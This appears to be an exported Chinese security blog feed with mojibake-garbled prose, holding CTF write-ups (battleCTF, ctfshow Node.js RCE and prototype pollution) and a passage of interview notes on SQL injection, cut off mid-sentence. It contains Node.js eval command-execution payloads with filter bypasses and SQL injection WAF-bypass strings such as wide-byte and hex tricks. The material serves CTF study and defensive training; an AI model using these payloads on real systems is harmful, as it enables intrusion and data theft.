<h3 id="Find-Me"><a href="#Find-Me" class="headerlink" title="Find Me"></a>Find Me</h3><p>æ˜¯ä¸€é“æµé‡åˆ†æé¢˜<br><img src="https://img-blog.csdnimg.cn/fc1e3addbbd644998d2bc407ce192e81.png" alt="7"><br>è¿‡æ»¤httpåŒ…<br><img src="https://img-blog.csdnimg.cn/75c6715314054dfa82d12a4cc6b877f5.png" alt="1"><br>è´¦æˆ·å¯†ç ä¸€èˆ¬æ˜¯POSTæ–¹å¼ä¼ å…¥ï¼ŒæŸ¥çœ‹åˆ°å¯†ç å¯†æ–‡ï¼Œå°±æ˜¯ç®€å•çš„base46åŠ å¯†ã€‚è§£ç ä¹‹åå¾—åˆ°æ˜æ–‡å¯†ç <br><img src="https://img-blog.csdnimg.cn/db80329811b0440991c50c78e908797c.png" alt="1"><br>æœ€åflagä¸º<code>battleCTF&#123;PApdsjRTae&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Back-To-Origin"><a href="#Back-To-Origin" class="headerlink" title="Back To Origin"></a>Back To Origin</h3><p><img src="https://img-blog.csdnimg.cn/ac05d62cc039487b89ae19d4e08314fe.png" alt="1">å¤åŸƒåŠè±¡å½¢æ–‡å­—<br><a href="https://www.likefont.com/">è¯†åˆ«å­—ä½“ç½‘ç«™</a></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-nodejs</title>
    <url>/2023/06/23/ctfshoow-nodejs/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>ä¸€é“rceé¢˜ç›®<br><strong>require(â€˜child_processâ€™).execSync(â€˜lsâ€™);</strong></p>
<h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p>å‘ç°è¢«è¿‡æ»¤äº†ä¸œè¥¿ï¼Œ<br><code>?eval=__filename</code>:æ‰“å°å‡ºå½“ä¸‹æ–‡ä»¶è·¯å¾„ã€‚<br><code>?eval=__dirname</code>:æ‰“å°å‡ºå½“ä¸‹æ‰€åœ¨æ–‡ä»¶å¤¹è·¯å¾„ã€‚<br><img src="https://img-blog.csdnimg.cn/e9bed0e011fc43859dc646488a80f9bd.png" alt="1"><br>ç„¶åè¯»å–æ–‡ä»¶<code>?eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;,&#39;utf-8&#39;)</code><br><img src="https://img-blog.csdnimg.cn/28c279fff781455bbb9b44b2c0556449.png" alt="2"><br>è¢«è¿‡æ»¤äº†ï¼Œç»•è¿‡è¿‡æ»¤ã€‚<br><code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;);</code>å†è¿›è¡Œurlç¼–ç ä¸€ä¸‹ã€‚<br><img src="https://img-blog.csdnimg.cn/d5576132fdeb4f0786bfb052d3b942c6.png" alt="3">å‘½ä»¤æ‰§è¡Œå³å¯å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/e59fe23388254d009bdd149868b776ec.png" alt="4"></p>
<p>è¯»å–æ–‡ä»¶å¾—åˆ°flagä¹Ÿè¡Œã€‚</p>
<h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/* GET home page. */</span>
router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  	res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç®€å•çš„æ•°ç»„ç»•è¿‡<code>?a[]=1&amp;b[]=1</code>å³å¯å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/03ad667c580b4a9d96f30777554c3985.png" alt="3"></p>
<h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><p>ä¸‹è½½ç»™çš„æºç ï¼Œæ‰¾åˆ°login.jsæ–‡ä»¶ã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">/* GET home page.  */</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>
  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//***å…³é”®ç‚¹</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token punctuation">&#125;</span>
  
  
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åŸå‹é“¾æ±¡æŸ“<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">å­¦ä¹ æ–‡ç« </a><br><img src="https://img-blog.csdnimg.cn/04baaf7cddac488a88409bfd74e1f5b4.png" alt="5"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>hvvåˆçº§é¢è¯•æ€»ç»“</title>
    <url>/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="OWASP-Top10æœ‰å“ªäº›æ¼æ´"><a href="#OWASP-Top10æœ‰å“ªäº›æ¼æ´" class="headerlink" title="OWASP Top10æœ‰å“ªäº›æ¼æ´"></a>OWASP Top10æœ‰å“ªäº›æ¼æ´</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">SQL</span>æ³¨å…¥
å¤±æ•ˆçš„èº«ä»½è®¤è¯
æ•æ„Ÿæ•°æ®æ³„éœ²
<span class="token constant">XML</span>å¤–éƒ¨å®ä½“ï¼ˆ<span class="token constant">XXE</span>ï¼‰
å¤±æ•ˆçš„è®¿é—®æ§åˆ¶
å®‰å…¨é…ç½®é”™è¯¯
è·¨ç«™è„šæœ¬ï¼ˆ<span class="token constant">XSS</span>ï¼‰
ä¸å®‰å…¨çš„ååºåˆ—åŒ–
ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶
ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å¸¸è§æ•°æ®åº“é»˜è®¤ç«¯å£"><a href="#å¸¸è§æ•°æ®åº“é»˜è®¤ç«¯å£" class="headerlink" title="å¸¸è§æ•°æ®åº“é»˜è®¤ç«¯å£"></a>å¸¸è§æ•°æ®åº“é»˜è®¤ç«¯å£</h2><p>MySqlï¼š3306</p>
<p>Oracleï¼š1521</p>
<p>Redisï¼š6379</p>
<p>Mssqlï¼š1433    &#x2F;&#x2F;å…¨ç§°ï¼šMicrosoft SQL Server</p>
<p>PostgreSQLï¼š5432</p>
<p><strong>ä½†åœ¨å®é™…ä½¿ç”¨ä¸­å¯èƒ½ä¼šæ ¹æ®éœ€è¦è¿›è¡Œä¿®æ”¹</strong></p>
<h2 id="SQLæ³¨å…¥çš„æµé‡åˆ†æ"><a href="#SQLæ³¨å…¥çš„æµé‡åˆ†æ" class="headerlink" title="SQLæ³¨å…¥çš„æµé‡åˆ†æ"></a>SQLæ³¨å…¥çš„æµé‡åˆ†æ</h2><p>é€šè¿‡æ—¥å¿—æŸ¥çœ‹æ”»å‡»è€…è¾“å…¥çš„å­—æ®µã€‚ä¸€èˆ¬åœ¨ç”¨æˆ·å¯†ç ç™»å½•æ—¶æ”»å‡»è€…ä¼šæ³¨å…¥æ¶æ„SQLè¯­å¥ï¼Œå¦‚æœç½‘ç«™ä¸å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹ è¿›è¡Œé™åˆ¶ï¼Œææ˜“å‡ºç°å¯¹ç½‘ç«™çš„ç ´åã€‚</p>
<p>union ,select ï¼Œsleep ç­‰æ•æ„Ÿå­—ç¬¦ã€‚</p>
<h2 id="å¸¸è§SQLæ³¨å…¥ç»•è¿‡"><a href="#å¸¸è§SQLæ³¨å…¥ç»•è¿‡" class="headerlink" title="å¸¸è§SQLæ³¨å…¥ç»•è¿‡"></a>å¸¸è§SQLæ³¨å…¥ç»•è¿‡</h2><p><strong>SQLæ³¨å…¥å¤§å°å†™ç»•è¿‡ï¼š</strong></p>
<p>é€šè¿‡å°†è¯­å¥å¤§å°å†™æ›´æ”¹ï¼Œè¿›è¡Œç»•è¿‡ã€‚ï¼ˆè¿™ç§æƒ…å†µé€šå¸¸å‡ºç°åœ¨WAFå¯¹æ‰“å°å†™æ²¡æœ‰è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">UniOn AND 1 &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQLæ³¨å…¥æ³¨é‡Šç¬¦ç»•è¿‡:</strong></p>
<p>é€šè¿‡æ·»åŠ æ³¨é‡Šç¬¦å¯¹è¯­å¥å†…å®¹è¿›è¡Œç»•</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;*ç»•è¿‡çš„å†…å®¹*&#x2F;select user,password from &#x2F;**&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQLæ³¨å…¥ç©ºæ ¼ç»•è¿‡</strong></p>
<p>é€šè¿‡æ·»åŠ ç©ºæ ¼çš„URLç¼–ç è¿›å…¥ç»•è¿‡</p>
<pre class="line-numbers language-none"><code class="language-none">ç©ºæ ¼çš„URLç¼–ç %20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQLæ³¨å…¥å¼•å·ç»•è¿‡</strong></p>
<p>ä½¿ç”¨åˆ°å¼•å·çš„åœ°æ–¹ä¸€èˆ¬åœ¨è¯­å¥ä¸­ï¼Œåƒwhereè¯­å¥ï¼Œè¿™æ¡è¯­å¥æ„è¯†å°±æ˜¯ç”¨æ¥æŸ¥å¾—åˆ°usersè¡¨ä¸­æ‰€æœ‰å­—æ®µ</p>
<pre class="line-numbers language-none"><code class="language-none">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;&quot;text&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQLæ³¨å…¥åå…­è¿›åˆ¶ç»•è¿‡</strong></p>
<p>å½“å¼•å·ç»•è¿‡æ–¹æ³•è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥åˆ©ç”¨è¿›åˆ¶è¿›è¡Œç»•è¿‡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">å°†usersè½¬æ¢ä¸ºåå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡select column_name from information_schema.tables where table_name&#x3D;0x7573657273<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQLæ³¨å…¥from forè¯­å¥ç»•è¿‡</strong></p>
<p>å½“è¿›è¡ŒSQLç›²æ³¨ä¼šç”¨åˆ°ï¼Œ<code>substr()</code> ,<code>mid()</code> ,<code>limit</code>ã€‚è¿™äº›å¥å­æ–¹æ³•éƒ½éœ€è¦ç”¨åˆ°é€—å·ã€‚å¯¹äº<code>substr()</code> ,<code>mid()</code> å¥å­å¯ä»¥ç›´æ¥åˆ©ç”¨from forå¥å­è¿›è¡Œç»•è¿‡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">å•å¼•å·ç»•è¿‡ï¼Œä¸from forç»•è¿‡ select substr(database() from 1 for 1)&#x3D;&#39;tyaq&#39;; select mid(database() from 1 for 1)&#x3D;&#39;tyaq&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQLæ³¨å…¥æ¯”è¾ƒç¬¦ç»•è¿‡&lt;&gt;</strong></p>
<p>sqlç›²æ³¨,ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾æ—¶éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒç¬¦æ¥è¿›è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQLæ³¨å…¥greatestç»•è¿‡</strong></p>
<p>å½“æ¯”è¾ƒç¬¦è¢«ç³»ç»Ÿè¿‡æ»¤äº†ï¼Œæ¯”è¾ƒç¬¦ç›²æ³¨è¯­å¥æ— æ³•ä½¿ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨greatestæ¥ä»£æ›¿æ¯”è¾ƒæ“ä½œç¬¦ã€‚<code>greatest(n1,n2,n3,n4ç­‰)</code>å‡½æ•°è¿”å›è¾“å…¥å‚æ•°<code>(n1,n2,n3,n4ç­‰)</code>çš„æœ€å¤§å€¼ã€‚</p>
<p>sqlè¯­å¥å¯ä»¥ä½¿ç”¨greatestå˜ä¸ºasciiç å€¼è¿›è¡Œå¤§å°çˆ†ç ´</p>
<pre class="line-numbers language-none"><code class="language-none">select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;88;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQLæ³¨å…¥ç¼–ç ç»•è¿‡</strong></p>
<p>URLEncodeç¼–ç ï¼ŒASCII,HEX,unicodeç¼–ç ç»•è¿‡ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">ASCIIç ç»•è¿‡Test ç­‰ä»·äºCHAR(55)+CHAR(66)+CHAR(88)+CHAR(99)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯¹å…³é”®å­—è¿›è¡ŒURLç¼–ç ç»•è¿‡</p>
<pre class="line-numbers language-none"><code class="language-none">URLç¼–ç è½¬æ¢ç»•è¿‡1+and+1&#x3D;11+%25%36%31%25%36%65%25%36%34+1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>16è¿›åˆ¶ç¼–ç è½¬æ¢ç»•è¿‡</p>
<pre class="line-numbers language-none"><code class="language-none">å°†usersè½¬æ¢ä¸ºåå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡select column_name from information_schema.tables where table_name&#x3D;users;select column_name from information_schema.tables where table_name&#x3D;0x7573657273;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQLæ³¨å…¥å†…è”æ³¨é‡Šç»•è¿‡</strong></p>
<pre class="line-numbers language-none"><code class="language-none">å†…è”æ³¨é‡Šå°±æ˜¯æŠŠä¸€äº›ç‰¹æœ‰çš„ä»…åœ¨MYSQLä¸Šçš„è¯­å¥æ”¾åœ¨ &#x2F;!..&#x2F; ä¸­ï¼Œè¿™äº›è¯­å¥å¦‚æœåœ¨å…¶å®ƒæ•°æ®åº“ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œè€Œåœ¨SQLæ•°æ®åº“ä¸­å¯è¢«æ‰§è¡Œ select * from cms_users where userid&#x3D;1 union &#x2F;*!select*&#x2F; 1,2,3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="sqlæ³¨å…¥è¿‡æ»¤"><a href="#sqlæ³¨å…¥è¿‡æ»¤" class="headerlink" title="sqlæ³¨å…¥è¿‡æ»¤"></a>sqlæ³¨å…¥è¿‡æ»¤</h2><ol>
<li><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼šå‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥å°†ç”¨æˆ·è¾“å…¥å’ŒSQLä»£ç åˆ†å¼€ï¼Œä»è€Œé¿å…SQLæ³¨å…¥æ”»å‡»ã€‚é€šè¿‡ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥å’Œå‚æ•°åŒ–æŸ¥è¯¢è¯­å¥ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥æŠŠç”¨æˆ·è¾“å…¥è½¬åŒ–ä¸ºå‚æ•°ï¼Œè€Œä¸æ˜¯ç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­ã€‚</li>
<li><strong>å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤å’ŒéªŒè¯</strong>ï¼šåœ¨åº”ç”¨ç¨‹åºä¸­å¯¹è¾“å…¥æ•°æ®è¿›è¡Œè¿‡æ»¤å’ŒéªŒè¯ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å‡å°‘SQLæ³¨å…¥æ”»å‡»çš„é£é™©ã€‚å¯ä»¥ä½¿ç”¨ç™½åå•æˆ–é»‘åå•æœºåˆ¶ï¼Œè¿‡æ»¤æ‰éæ³•å­—ç¬¦æˆ–è¯­å¥ï¼Œæˆ–è€…å¯¹è¾“å…¥æ•°æ®è¿›è¡Œæ ¼å¼éªŒè¯å’Œé•¿åº¦é™åˆ¶ã€‚</li>
<li><strong>ä½¿ç”¨ORMæ¡†æ¶</strong>ï¼šä½¿ç”¨ORMæ¡†æ¶å¯ä»¥é¿å…æ‰‹åŠ¨æ‹¼æ¥SQLè¯­å¥ï¼Œä»è€Œå‡å°‘SQLæ³¨å…¥æ”»å‡»çš„é£é™©ã€‚ORMæ¡†æ¶å¯ä»¥è‡ªåŠ¨å°†æ•°æ®è½¬æ¢ä¸ºå‚æ•°ï¼Œä»è€Œé˜²æ­¢æ¶æ„SQLæ³¨å…¥æ”»å‡»ã€‚</li>
<li><strong>ä½¿ç”¨é˜²ç«å¢™</strong>ï¼šä½¿ç”¨Webåº”ç”¨ç¨‹åºé˜²ç«å¢™å¯ä»¥ç›‘æµ‹å’Œé˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚é˜²ç«å¢™å¯ä»¥å¯¹è¾“å…¥æ•°æ®è¿›è¡Œæ£€æŸ¥ï¼Œè¿‡æ»¤æ‰æ¶æ„SQLè¯­å¥ï¼Œä»è€Œä¿æŠ¤åº”ç”¨ç¨‹åºä¸å—æ”»å‡»ã€‚</li>
</ol>
<h2 id="Sqlæ³¨å…¥åˆ†ç±»"><a href="#Sqlæ³¨å…¥åˆ†ç±»" class="headerlink" title="Sqlæ³¨å…¥åˆ†ç±»"></a>Sqlæ³¨å…¥åˆ†ç±»</h2><p>æŠ¥é”™æ³¨å…¥ã€ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ã€äºŒæ¬¡æ³¨å…¥ï¼Œå®½å­—èŠ‚,å †å æ³¨å…¥ï¼Œhttp headerçš„æ³¨å…¥ï¼Œxffï¼Œcookieæ³¨å…¥</p>
<h3 id="å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶"><a href="#å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶"></a><strong>å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶</strong></h3><p>1.æ•°æ®åº“ä¸ºGBKç¼–ç <br> 2.ä½¿ç”¨äº†è½¬ä¹‰å‡½æ•°ï¼Œå°†ã€POGETSTã€cookieä¼ é€’çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå°†å•å¼•å·ã€åŒå¼•å·ã€nullç­‰æ•æ„Ÿå­—ç¬¦ç”¨è½¬ä¹‰ç¬¦  \  è¿›è¡Œè½¬ä¹‰</p>
<h3 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a><strong>ç»•è¿‡æ–¹å¼</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root %df' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
<span class="token comment"># åŸç†:åœ¨GBKç¼–ç ä¸­,åæ–œæ çš„ç¼–ç æ˜¯%5c,åœ¨è¾“å…¥%dfåï¼Œä½¿å¾—æ·»åŠ åæ–œæ åå½¢æˆ%df%5cï¼Œè€Œ%df%5cæ˜¯ç¹ä½“å­—â€œé€£â€ï¼Œå•å¼•å·æˆåŠŸé€ƒé€¸ï¼Œçˆ†å‡ºMysqlæ•°æ®åº“çš„é”™è¯¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="SQLäºŒæ¬¡æ³¨å…¥"><a href="#SQLäºŒæ¬¡æ³¨å…¥" class="headerlink" title="SQLäºŒæ¬¡æ³¨å…¥"></a>SQLäºŒæ¬¡æ³¨å…¥</h2><p>äºŒæ¬¡æ³¨å…¥çš„åŸç†ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä½¿ç”¨äº† addslashes ã€get_magic_quotes_gpcã€mysql_escape_stringã€mysql_real_escape_stringç­‰å‡½æ•°å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†æ˜¯addslashesæœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯è™½ç„¶å‚æ•°åœ¨è¿‡æ»¤åä¼šæ·»åŠ  â€œ\â€ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯â€œ\â€å¹¶ä¸ä¼šæ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ 